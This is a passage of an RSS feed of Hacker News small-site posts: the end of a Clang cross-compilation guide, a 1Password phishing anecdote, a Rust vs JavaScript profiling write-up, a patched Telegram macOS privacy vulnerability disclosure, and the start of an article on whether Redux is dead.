        libc++.so.1 <span>=&gt;</span> /usr/lib/libc++.so.1 <span>(</span>0x402e4000<span>)</span>
        libcxxrt.so.1 <span>=&gt;</span> /lib/libcxxrt.so.1 <span>(</span>0x403da000<span>)</span>
        libm.so.5 <span>=&gt;</span> /lib/libm.so.5 <span>(</span>0x40426000<span>)</span>
        libc.so.7 <span>=&gt;</span> /lib/libc.so.7 <span>(</span>0x40491000<span>)</span>
        libgcc_s.so.1 <span>=&gt;</span> /lib/libgcc_s.so.1 <span>(</span>0x408aa000<span>)</span>
FreeBSD-ARM64-VM <span>$ </span>./zpipe <span>-h</span>
zpipe usage: zpipe <span>[</span><span>-d</span><span>]</span> &lt; <span>source</span> <span>&gt;</span> dest
</code></pre></div></div>

<p>Success! It’s now possible to use this cross toolchain to build larger programs, and below I’ll give a quick example to how to use it to build real projects.</p>

<h3 id="optional-creating-an-llvm-toolchain-directory">Optional: creating an LLVM toolchain directory</h3>

<p>LLVM provides a mostly compatible counterpart for almost every tool shipped by <code>binutils</code> (with the notable exception of <code>as</code> <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>), prefixed with <code>llvm-</code>.</p>

<p>The most critical of these is LLD, which is a drop in replacement for a plaform’s system linker, capable to replace both GNU <code>ld.bfd</code> and <code>gold</code> on GNU/Linux or BSD, and Microsoft’s <code>LINK.EXE</code> when targeting MSVC. It supports linking on (almost) every platform supported by LLVM, thus removing the nuisance to have multiple specific linkers installed.</p>

<p>Both GCC and Clang support using <code>ld.lld</code> instead of the system linker (which may well be <code>lld</code>, like on FreeBSD) via the command line switch <code>-fuse-ld=lld</code>.</p>

<p>In my experience, I found that Clang’s driver might get confused when picking the right linker on some uncommon platforms, especially before version 11.0.
For some reason, <code>clang</code> sometimes decided to outright ignore the <code>-fuse-ld=lld</code> switch and picked the system linker (<code>ld.bfd</code> in my case), which does not support AArch64.</p>

<p>A fast solution to this is to create a toolchain directory containing symlinks that rename the LLVM utilities to the standard <code>binutils</code> programs:</p>

<div><div><pre><code><span>$ </span> <span>ls</span> <span>-la</span> ~/.llvm/bin/
Permissions Size User  Group Date Modified Name
lrwxrwxrwx    16 marco marco  3 Aug  2020  ar -&gt; /usr/bin/llvm-ar
lrwxrwxrwx    12 marco marco  6 Aug  2020  ld -&gt; /usr/bin/lld
lrwxrwxrwx    21 marco marco  3 Aug  2020  objcopy -&gt; /usr/bin/llvm-objcopy
lrwxrwxrwx    21 marco marco  3 Aug  2020  objdump -&gt; /usr/bin/llvm-objdump
lrwxrwxrwx    20 marco marco  3 Aug  2020  ranlib -&gt; /usr/bin/llvm-ranlib
lrwxrwxrwx    21 marco marco  3 Aug  2020  strings -&gt; /usr/bin/llvm-strings
</code></pre></div></div>

<p>The <code>-B</code> switch can then be used to force Clang (or GCC) to search the required tools in this directory, stopping the issue from ever occurring:</p>

<div><div><pre><code><span>$ </span> clang++ <span>-B</span><span>$HOME</span>/.llvm/bin <span>-stdlib</span><span>=</span>libc++ <span>--target</span><span>=</span>aarch64-pc-freebsd <span>--sysroot</span><span>=</span><span>$HOME</span>/farm_tree <span>-std</span><span>=</span>c++17 <span>-o</span> mvd-farm64 mvd.cc
<span>$ </span>file mvd-farm64
mvd-farm64: ELF 64-bit LSB executable, ARM aarch64, version 1 <span>(</span>FreeBSD<span>)</span>, dynamically linked, interpreter /libexec/ld-elf.so.1, <span>for </span>FreeBSD 13.0, FreeBSD-style, with debug_info, not stripped
</code></pre></div></div>

<h3 id="optional-creating-clang-wrappers-to-simplify-cross-compilation">Optional: creating Clang wrappers to simplify cross-compilation</h3>

<p>I happened to notice that certain build systems (and with <em>“certain”</em> I mean some poorly written <code>Makefile</code>s and sometimes Autotools) have a tendency to misbehave when <code>$CC</code>, <code>$CXX</code> or <code>$LD</code> contain spaces or multiple …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mcilloni.ovh/2021/02/09/cxx-cross-clang/">https://mcilloni.ovh/2021/02/09/cxx-cross-clang/</a></em></p>]]>
            </description>
            <link>https://mcilloni.ovh/2021/02/09/cxx-cross-clang/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111761</guid>
            <pubDate>Fri, 12 Feb 2021 08:42:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I'm Glad for Using 1Password]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26111393">thread link</a>) | @bengtan
<br/>
February 11, 2021 | https://marcel.is/1password/ | <a href="https://web.archive.org/web/*/https://marcel.is/1password/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past month, two things happened to me that made me realize how glad I'm for using a password manager, namely <a href="https://1password.com/">1Password</a>.</p>
<p>First thing is about a login page. I was searching for a Github repo on DuckDuckGo, and I clicked on a link in the search results. As I was about to fill in the password with a 1Password shortcut, I noticed that 1Password wasn't filling in the login details. How strange, I thought. Puzzled, I looked at the url. And then I saw it—I almost fell for a phishing attack! The url was <a href="https://marcel.is/1password/github.com.cnpmjs.org">github.com.cnpmjs.org</a> instead of <a href="https://github.com/">github.com</a>. I knew of phishing attacks, and thought I'd never fell for such a simple trick. Yet, I almost did.</p>
<p>Second thing is about email. As I'm migrating away from gmail, I thought I would check out the spam folder. I usually don't do that, but I thought I'd peek in. One email caught my eye: the email subject was my password. The site must have been compromised and the attacker got hold of my email and password. Fortunately, the damage radius was minimal, as I have generated unique passwords for each site.</p>
<p><img src="https://marcel.is/img/1password-email.png" alt="1password-email"></p></div></div>]]>
            </description>
            <link>https://marcel.is/1password/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111393</guid>
            <pubDate>Fri, 12 Feb 2021 07:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Showdown: Rust vs Javascript (2020)]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 101 (<a href="https://news.ycombinator.com/item?id=26111387">thread link</a>) | @KingOfCoders
<br/>
February 11, 2021 | https://cesarvr.io/post/rust-performance/ | <a href="https://web.archive.org/web/*/https://cesarvr.io/post/rust-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After spending some weeks playing with Rust, I felt ready to test my skills and try some programming challenges in the <a href="https://adventofcode.com/">Advent Of Code</a>. My approach to tackle some of those challenges was to solve them using Javascript (I use it in my day to day) first and then port the code to Rust. While writing the port I just focus on getting the Rust code as elegant as possible to achieve that I research the Rust API's to get syntactically correct. It was after finishing porting this <a href="https://adventofcode.com/2018/day/5">puzzle</a> in particular and feeling a sense of accomplishment that I decided to test how the Rust compiled code will perform against Javascript interpreter.</p><h2 id="naive-algorithm">Naive Algorithm</h2><hr><p>Before jumping to the whom-was-slower-and-why, let’s take a quick look at <a href="https://adventofcode.com/2018/day/5">puzzle</a> (so you see there is no hidden agenda) which goes like this:</p><p>You are given an input string with <code>N</code> amount of characters and we should write an algorithm that find and remove any sequential pairs of characters that similar but have different capitalisation, examples of this are:</p><div><pre><code data-lang="sh">bB <span># Remove</span>
bb <span># Do Nothing</span>
ab <span># Do Nothing</span>
</code></pre></div><p>The algorithm should re-evaluate the string recursively searching for new pairs created after the removal, something like tetris.</p><p>We have this input:</p><p>We should remove <code>bB</code> to get:</p><p>Then because <code>aA</code> has been formed we should eliminated this too:</p><p>Then we remove <code>dD</code> and the final string should be:</p><h3 id="my-solution">My Solution</h3><p>To solve this I wrote two functions, one that <code>process</code> takes array of characters, traverse the array a pair at a time and validate that they follow the rules mentioned above:</p><h4 id="rust">Rust</h4><hr><div><pre><code data-lang="rust"><span>fn</span> <span>process</span>(tokens: <span>&amp;</span><span>mut</span> Vec<span>&lt;</span>String<span>&gt;</span>) -&gt; <span>i32</span> {
  <span>let</span> <span>mut</span> polymer: Vec<span>&lt;</span>String<span>&gt;</span> <span>=</span> Vec::new();

  <span>while</span> <span>let</span> Some(token) <span>=</span> tokens.pop() {
      <span>if</span> polymer.is_empty() {
          polymer.push(token);
          <span>continue</span>;
      }

      <span>let</span> candidate <span>=</span> polymer.pop().unwrap();

      <span>if</span> <span>!</span>react(<span>&amp;</span>candidate, <span>&amp;</span>token) {
          polymer.push(candidate.to_string());
          polymer.push(token.to_string());
      }
  }

  polymer.len() <span>as</span> <span>i32</span>
}
</code></pre></div><h4 id="javascript">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>process</span>(<span>data</span>) {
  <span>let</span> <span>queue</span> <span>=</span> []  <span>// Save here tested characters.
</span><span></span>
  <span>while</span>(<span>data</span>.<span>length</span> <span>&gt;</span> <span>0</span>) {
    <span>let</span> <span>candidate_1</span> <span>=</span> <span>data</span>.<span>pop</span>()
    <span>let</span> <span>candidate_2</span> <span>=</span> <span>queue</span>.<span>pop</span>() <span>// get the last character that passed the test.
</span><span></span>
    <span>if</span> (<span>candidate_2</span> <span>===</span> <span>undefined</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
      <span>continue</span>
    }

    <span>let</span> <span>react</span> <span>=</span> <span>reacting</span>(<span>candidate_1</span>, <span>candidate_2</span>)

    <span>if</span>(<span>!</span><span>react</span>) {
      <span>queue</span>.<span>push</span>(<span>candidate_2</span>)
      <span>queue</span>.<span>push</span>(<span>candidate_1</span>)
    }
  }

  <span>return</span> <span>result</span>.<span>length</span>
}

</code></pre></div><blockquote><p><em>Notice</em> the <em>performance</em> optimization by keeping the last character in a different queue, that way we don’t need to traverse the whole array looking for matches after a previous removal.</p></blockquote><p>Then each pair of characters is evaluated using a function called <code>react</code> that returns <code>true</code> or <code>false</code> if the pair need to be removed:</p><h4 id="rust-1">Rust</h4><hr><div><pre><code data-lang="rust">
  <span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {
        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
  }
</code></pre></div><h4 id="javascript-1">Javascript</h4><hr><div><pre><code data-lang="js"><span>function</span> <span>react</span>(<span>candidate_1</span>, <span>candidate_2</span>) {
  <span>if</span> (<span>candidate_1</span>.<span>toLowerCase</span>() <span>===</span> <span>candidate_2</span>.<span>toLowerCase</span>()) {
    <span>if</span> ( <span>candidate_1</span> <span>!==</span> <span>candidate_2</span> ) {
      <span>return</span> <span>true</span>
    }
  }

  <span>return</span> <span>false</span>
}
</code></pre></div><blockquote><p>Basically is a rudimentary implementation of an <strong>equals-ignore-case</strong> plus an additional check to see if they are they same character (the same capitalization).</p></blockquote><p>To complete the challenge each version (Rust, Javascript) needs to reduce a large string (<a href="https://adventofcode.com/2018/day/5/input">50K character</a>) which is good enough to test how well one version performs against the other, then I run each code using Linux <code>time</code> and got this:</p><div><pre><code data-lang="python"><span># Javascript (Node.js)</span>
  real  <span>0</span>m0<span>.</span><span>374</span>s
  user  <span>0</span>m0<span>.</span><span>301</span>s
  sys   <span>0</span>m0<span>.</span><span>030</span>s

<span># Rust</span>
  real  <span>0</span>m0<span>.</span><span>720</span>s
  user  <span>0</span>m0<span>.</span><span>636</span>s
  sys   <span>0</span>m0<span>.</span><span>012</span>s
</code></pre></div><p>This is a surprising turn of events, here we can see the Rust version is <code>2x</code> slower than Javascript, How? My first reaction (in an act of self denial) was to check the compiler flags <code>opt-level</code> and after checking that was fine, which to be honest won’t make a difference, I started to look for inefficiencies in the code, first using the ancient <a href="http://www.brendangregg.com/methodology.html">Drunk man anti-method</a> technique and when that didn’t work, I end up settling for a more scientific method of profiling my code with <a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a>.</p><h2 id="debugging">Debugging</h2><hr><p>Every time you are debugging a performance issues you might feel tempted to start adding your own function to calculate the duration of suspicious section of code (like I used to do, in the past). <a href="http://www.brendangregg.com/perf.html">Perf</a> does this for you by taking various approaches such as listening to CPU/Kernel <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/developer_guide/perf">performance events</a> metrics emitted by the system in reaction of your process while running. Things like this makes perf the tool of choice to debug performance issues, so let’s see how it works.</p><h3 id="debugging-symbols">Debugging Symbols</h3><p>Before we start we need to enable the <a href="http://carol-nichols.com/2015/12/09/rust-profiling-on-osx-cpu-time/">debugging symbols</a> on the Rust compiler, this will make <code>perf</code> reports more informative. To enable this add <code>debug=true</code> to the <code>Cargo.toml</code>:</p><div><pre><code data-lang="toml">[<span>profile</span>.<span>release</span>]
<span>opt</span><span>-</span><span>level</span> = <span>3</span>
<span>debug</span>=<span>true</span>
</code></pre></div><h3 id="attaching-perf">Attaching Perf</h3><p>I recompiled the code and attached <code>perf</code>:</p><div><pre><code data-lang="zsh">cargo build
./target/release/day-5 &amp; perf record -F <span>99</span> -p <span>`</span>pgrep day-5<span>`</span>
</code></pre></div><ul><li>First we run the Rust program (<code>day-5</code>) and we send it to the background using the ampersand (<code>&amp;</code>) symbol.</li><li>Next to it, so it executes immediately, we run <code>perf</code> that receives the process identifier (<a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a>) courtesy of <code>pgrep day-5</code>.</li><li>The <a href="https://linux.die.net/man/1/pgrep">pgrep</a> command returns the <a href="https://en.wikipedia.org/wiki/Process_identifier">PID</a> of a process by name.</li></ul><p>Here is the output:</p><div><pre><code data-lang="bash"><span>[</span>1<span>]</span> <span>27466</span>
sample size <span>50003</span>
--
solution 1: <span>9526</span>
solution 2: <span>6694</span>


<span>[</span> perf record: Woken up <span>1</span> times to write data <span>]</span>
<span>[</span>1<span>]</span>  + <span>27466</span> <span>done</span>       ./target/release/day-5
<span>[</span> perf record: Captured and wrote 0.002 MB perf.data <span>(</span><span>13</span> samples<span>)</span> <span>]</span>
</code></pre></div><h3 id="report">Report</h3><p>After running this multiple times,<code>perf</code> automatically aggregates the data to a report file (<code>perf.data</code>) in the same folder where we are making the call.</p><p>Now we can visualise the report with:</p><p><img src="https://raw.githubusercontent.com/cesarvr/hugo-blog/master/static/rust/perf-1.png" alt=""></p><p>Interestingly the algorithm spend <strong>30 percent</strong> of the time in the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">String::to_lowercase</a> which is suspicious:</p><div><pre><code data-lang="rust"><span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {  <span>// 30% CPU wasted here
</span><span></span>        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
}
</code></pre></div><p>My first impression is that I made a mistake while running <code>perf</code> (never used it before with Rust), but everything started to make sense once I looked at the source code of the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">to_lowercase</a> function.</p><p>What happen is that Rust lowercase function try to be correct in any language, so it delegates this conversion to a function called <a href="https://doc.rust-lang.org/1.29.2/std_unicode/conversions/fn.to_lower.html">std_unicode::conversions</a> this function then does a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> of each character against a big array (≈1200) of unicode characters:</p><div><pre><code data-lang="rust">
<span>const</span> to_lowercase_table: <span>&amp;</span>[(char, [char; <span>3</span>])] <span>=</span> <span>&amp;</span>[
        (<span>'\u{41}'</span>, [<span>'\u{61}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{42}'</span>, [<span>'\u{62}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{43}'</span>,<span>//...≈1200 ]
</span><span></span>

 <span>pub</span> <span>fn</span> <span>to_lower</span>(c: <span>char</span>) -&gt; [char; <span>3</span>] {
        <span>match</span> bsearch_case_table(c, to_lowercase_table) {
            None        <span>=</span><span>&gt;</span> [c, <span>'\0'</span>, <span>'\0'</span>],
            Some(index) <span>=</span><span>&gt;</span> to_lowercase_table[index].<span>1</span>,
        }
    }

</code></pre></div><blockquote><p>Going back at the code, this binary search is done twice per iteration now multiply this by <code>50K</code> and we found the reason for the slow down.</p></blockquote><p>After some googling I found that I should use <a href="https://doc.rust-lang.org/src/core/str/mod.rs.html#4006">eq_ignore_ascii_case</a> instead, which basically makes this operation in <a href="https://doc.rust-lang.org/1.37.0/src/core/slice/mod.rs.html#2487">linear time</a> and for one character is nearly the same as saying constant time. I recompiled the code and run the benchmarks:</p><div><pre><code data-lang="xml">Node.JS
real  0m0.374s
user  0m0.301s
sys   0m0.030s

Rust
real  0m0.283s
user  0m0.248s
sys   0m0.005s
</code></pre></div><p>Now we are talking, profiling has pay its dividends and made the Rust program <code>2.5x</code> <em>faster</em> than the original and <code>91ms</code> faster than the Javascript version, I can start celebrating and telling my friends that I’m a Rust expert now. But this leaves me with some questions:</p><blockquote><p>The <code>91ms</code> is not bad, but I wonder how much effort it will take to optimize this code to make it <code>&gt;1.5x</code> faster than the Javascript counterpart?</p></blockquote><h2 id="performance-on-macos">Performance On MacOS</h2><p>While I was thinking of this and was in the middle of unpacking my Rust stickers and preparing my laptop for some re-branding, I decided to move the code (Javascript and Rust) from my Linux VM to my main OS (<strong>MacOS Catalina</strong>), once there I gave the benchmark another try because I <em>love</em> suffering:</p><div><pre><code data-lang="sh">Node   0.17s user 0.03s system 101% cpu 0.209 total
Rust   0.23s user 0.01s system 98% cpu 0.238 total
</code></pre></div><p>After seeing this my confidence in my time measuring tool (<code>time</code>) started to fade a bit, but once I calm down and use the <a href="https://developer.apple.com/library/archive/documentation/AnalysisTools/Conceptual/instruments_help-collection/Chapter/Chapter.html">XCode Instrumentation</a> which point me in the right direction:</p><p><img src="https://github.com/cesarvr/hugo-blog/blob/master/static/rust/malloc-xcode-2.png?raw=true" alt=""></p><blockquote><p>The slowest part of the program (Rust version) is the part that does the allocation and deallocation of memory produced when calling MacOS <code>malloc</code>.</p></blockquote><p>To catch this one I'll need to dig more into Rust inner workings. Does this make it more expensive to get performance out of Rust? Did I choose the wrong abstractions? That's for another post. If you want to take a look at the code yourself here is the <a href="https://github.com/cesarvr/AOCRust/tree/master/day-5">Rust</a> and <a href="https://github.com/cesarvr/AOCRust/tree/master/JS">JS</a>, if you have any improvement, idea, suggestions or performance trick let me know by <a href="https://twitter.com/cvaldezr">Twitter</a>, <a href="https://github.com/cesarvr/AOCRust">pull request</a> or <a href="https://github.com/cesarvr/hugo-blog/issues">open an issue</a>.</p></div></div>]]>
            </description>
            <link>https://cesarvr.io/post/rust-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111387</guid>
            <pubDate>Fri, 12 Feb 2021 07:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “P” in Telegram stands for Privacy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26111309">thread link</a>) | @giuliomagnifico
<br/>
February 11, 2021 | https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html | <a href="https://web.archive.org/web/*/https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-5173062149660468180">
<p><b>Summary: </b>While understanding the implementation of various security and privacy measures in telegram, I identified that telegram fails again in terms of handling the users data. My initial study started with understanding how self-destructing messages work in the secret chats option, telegram says that "<i>The clock starts ticking the moment the message is displayed on the recipient's screen (gets two check marks). As soon as the time runs out, the message disappears from both devices.</i>"&nbsp; <br></p><div><p>Telegram which has <span>500 million active users suffers from</span> a logical bug exists in telegram for macOS (7.3 (211334) Stable) which stores the local copy of received message (audio/video) on a custom path even after those messages are deleted/disappeared from the secret chat.</p></div>
<div>
  <p><b>Technical analysis:</b> Open telegram for macOS, send a recorded audio/video message in normal chat, the application leaks the sandbox path where the recorded message is stored in ".mp4" file.</p></div>
<p><a href="https://1.bp.blogspot.com/-OWIztNLn6eA/X-mWOOVyHSI/AAAAAAAAD2c/sYkz0hSjzX41bCvNuS9fTy6QW14G6v6TgCPcBGAYYCw/s2560/Telegram_Info_Leak.gif"><img data-original-height="880" data-original-width="2560" src="https://1.bp.blogspot.com/-OWIztNLn6eA/X-mWOOVyHSI/AAAAAAAAD2c/sYkz0hSjzX41bCvNuS9fTy6QW14G6v6TgCPcBGAYYCw/s16000/Telegram_Info_Leak.gif"></a></p><p>
  In my case the path was (<span><span>/var/folders/x7/khjtxvbn0lzgjyy9xzc18z100000gn/T/</span></span>). While performing the same task under secret chat option the
  <span>MediaResourceData(path://)</span> URI was not
  leaked but the recorded audio/video message still gets stored on the above
  path.<br>
</p>

<div>
  <iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="549" src="https://www.youtube.com/embed/Go-4srm_1fQ" width="875"></iframe><p>&nbsp;In the video proof-of-concept the user receives a self-destructed message in the secret chat option, which gets stored even after the message is self-destructed.</p></div><p><b>Bonus: </b>The above mentioned version of telegram for macOS stores local passcode in plain text, below is the video proof-of-concept.</p><iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="549" src="https://www.youtube.com/embed/zEt-_5b4OaA" width="875"></iframe><div><p>Both the vulnerabilities was patched in version <a href="https://macos.telegram.org/#v7-4-2021-01-29" target="_blank">7.4 (212543) Stable</a> and 3000 EURO bounty was awarded. In past I've identified multiple vulnerabilities under Telegram you can read them <a href="https://www.inputzero.io/" target="_blank">here</a>. Later today Fri 12 Feb 12:15 PM, CVE-2021-27204 &amp; CVE-2021-27205 was assigned. What next?</p><blockquote><p dir="ltr" lang="en">Use Signal</p>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1347165127036977153?ref_src=twsrc%5Etfw">January 7, 2021</a></blockquote> </div>
<p>
Share: <a href="https://www.facebook.com/share.php?v=4&amp;src=bm&amp;u=https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html&amp;t=The%20%22P%22%20in%20Telegram%20stands%20for%20Privacy" onclick="window.open(this.href,&quot;sharer&quot;,&quot;toolbar=0,status=0,width=626,height=436&quot;); return false;" rel="nofollow" target="_blank" title="Share this on Facebook"><i></i></a><a href="https://twitter.com/home?status=The%20%22P%22%20in%20Telegram%20stands%20for%20Privacy%20--%20https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html" rel="nofollow" target="_blank" title="Tweet This!"><i></i></a><a href="https://plus.google.com/share?url=https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html" onclick="javascript:window.open(this.href,   &quot;&quot;, &quot;menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600&quot;);return false;" rel="nofollow" target="_blank" title="Share this on Google+"><i></i></a><a href="https://pinterest.com/pin/create/button/?source_url=https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html&amp;media=https://1.bp.blogspot.com/-OWIztNLn6eA/X-mWOOVyHSI/AAAAAAAAD2c/sYkz0hSjzX41bCvNuS9fTy6QW14G6v6TgCPcBGAYYCw/s16000/Telegram_Info_Leak.gif&amp;description=The%20%22P%22%20in%20Telegram%20stands%20for%20Privacy" rel="nofollow" target="_blank" title="Share on Pinterest"><i></i></a>
</p>

</div></div>]]>
            </description>
            <link>https://www.inputzero.io/2020/12/telegram-privacy-fails-again.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111309</guid>
            <pubDate>Fri, 12 Feb 2021 06:55:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Redux Dead?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26111098">thread link</a>) | @deleteman
<br/>
February 11, 2021 | https://blog.asayer.io/is-redux-dead | <a href="https://web.archive.org/web/*/https://blog.asayer.io/is-redux-dead">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>React revolutionized front end development as most people knew it when it was first released. This new approach to writing code triggered incredible innovation in how to handle state changes and UI updates.</p><p>This revolution had its downsides, too. One of them was a culture of over-engineering solutions to challenges that could be solved in simpler ways. A typical example of this is how state has been managed in React applications.</p><p>Redux has become a hallmark of many React applications created in the last couple of years. The allure of having a single state object, available everywhere in your application sure sounds nice. But has its time passed? Has React evolved to a point where these kinds of state management tools add more complexity than they solve?</p><p>This article aims to give you a deeper understanding of which situations warrants state management tools like Redux. We’ll discuss the reasons behind the rise of Redux, and what has changed in the last couple of years - both in React and in Redux. Finally, we’ll look into what might be coming in the future.</p><h2 id="redux---and-why-people-started-using-it">Redux - and why people started using it</h2><p>When it was first released , React didn’t have an officially supported way to pass data far down the component tree. If you had some kind of shared state, configuration or other information you would like to use anywhere in you application, you had to pass it down from parent to child to sibling to another child. There <em>was</em> a way to avoid it, but that way - the “legacy context API” was never officially supported, and was documented with a warning that it should not be used.</p><p>About the same time React was released to the public, some other Facebook engineers <a href="https://www.youtube.com/watch?list=PLb0IAmt7-GS188xDYE-u1ShQmFFGbrk0v&amp;v=nYkdrAPrdcw&amp;feature=emb_title" target="_blank" rel="noreferrer">introduced a blueprint</a> for how they created front end applications - the <a href="https://facebook.github.io/flux/" target="_blank" rel="noreferrer">Flux architecture</a>. It complimented React’s component-centric design by having a unidirectional data flow, which made things both easy to follow and simple to understand.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/176421ef1740882c46b0283385b27764/ff5cf/d97c68cc0c034806aa6ff882a5f51995.png" srcset="https://blog.asayer.io/static/176421ef1740882c46b0283385b27764/ff5cf/d97c68cc0c034806aa6ff882a5f51995.png 1300w" sizes="(max-width: 1300px) 100vw, 1300px" alt="Flux Architecture">
<em>(photo borrowed from <a href="https://facebook.github.io/flux/docs/in-depth-overview" target="_blank" rel="noreferrer">https://facebook.github.io/flux/docs/in-depth-overview</a>)</em></p><p>While many famous open sourcerers were busy fighting over which slightly different implementation of this was the best, a young Russian developer named Dan Abramov introduced an implementation based on the <a href="https://guide.elm-lang.org/architecture/" target="_blank" rel="noreferrer">Elm architecture</a>, called Redux.</p><p><a href="https://youtu.be/xsSnOQynTHs" target="_blank" rel="noreferrer">https://youtu.be/xsSnOQynTHs</a></p><p>Redux was a pretty simple system, with a single state object, encased in a “store”, which could be updated by dispatching actions on it. The actions were sent to a “reducer” function, which returned a brand new copy of the entire application state, which would then propagate across your application.</p><p>Another great feature of Redux was how easy it was to use with React. Not only was it a great match with the programming model of React, it also solved the prop drilling issue! Just “connect” whatever component you want to a store, and you had access to any part of the application state you wanted. It was like magic!</p><h2 id="context-hooks-and-why-it-solved-much-of-what-redux-did">Context, hooks, and why it solved much of what Redux did</h2><p>With all its elegance and popularity though, Redux did have a few major downsides. For each new way of changing the state, you had to add a new action type and action creator, probably a dispatcher and a selector, and then you’d have to handle that new state change in an existing reducer, or create a new one. In other words - lots and lots of boilerplate.</p><p>When the 16.3 version of React was released, it finally shipped with a fully redesigned context API. With this new feature, prop drilling was suddenly as easy as wrapping any subsection of your application in a context provider, and fetching it again with a context consumer component.  Here’s an example of how that could be done:</p><div><pre><p><span>1</span><span>const</span><span> </span><span>UserContext</span><span> </span><span>=</span><span> </span><span>React</span><span>.</span><span>createContext</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span>2</span><span></span><span>class</span><span> </span><span>MyApp</span><span> </span><span>extends</span><span> </span><span>React</span><span>.</span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>  state </span><span>=</span><span> </span><span>{</span><span> user</span><span>:</span><span> </span><span>null</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>componentDidMount</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>    myApi</span><span>.</span><span>getUser</span><span>(</span><span>)</span><span></span></p><p><span>6</span><span>      </span><span>.</span><span>then</span><span>(</span><span>user</span><span> </span><span>=&gt;</span><span> </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span> user </span><span>}</span><span>)</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span>  </span><span>}</span><span></span></p><p><span>8</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>10</span><span>      </span><span>&lt;</span><span>UserContext</span><span>.</span><span>Provider</span><span> value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>user</span><span>}</span><span>&gt;</span><span></span></p><p><span>11</span><span>        </span><span>&lt;</span><span>SomeDeepHierarchy</span><span> </span><span>/</span><span>&gt;</span><span></span></p><p><span>12</span><span>      </span><span>&lt;</span><span>/</span><span>UserContext</span><span>.</span><span>Provider</span><span>&gt;</span><span></span></p><p><span>13</span><span>    </span><span>)</span><span>;</span><span></span></p><p><span>14</span><span>  </span><span>}</span><span></span></p><p><span>15</span><span></span><span>}</span><span>;</span><span></span></p><p><span>16</span><span></span><span>const</span><span> </span><span>UserGreeting</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>17</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>18</span><span>    </span><span>&lt;</span><span>UserContext</span><span>.</span><span>Consumer</span><span>&gt;</span><span></span></p><p><span>19</span><span>      </span><span>{</span><span>user</span><span> </span><span>=&gt;</span><span> </span><span>(</span><span> </span><span></span></p><p><span>20</span><span>        </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Hello</span><span> there</span><span>,</span><span> </span><span>{</span><span>user</span><span>.</span><span>name</span><span> </span><span>||</span><span> </span><span>'customer'</span><span>}</span><span>!</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span></span></p><p><span>21</span><span>      </span><span>)</span><span>}</span><span></span></p><p><span>22</span><span>    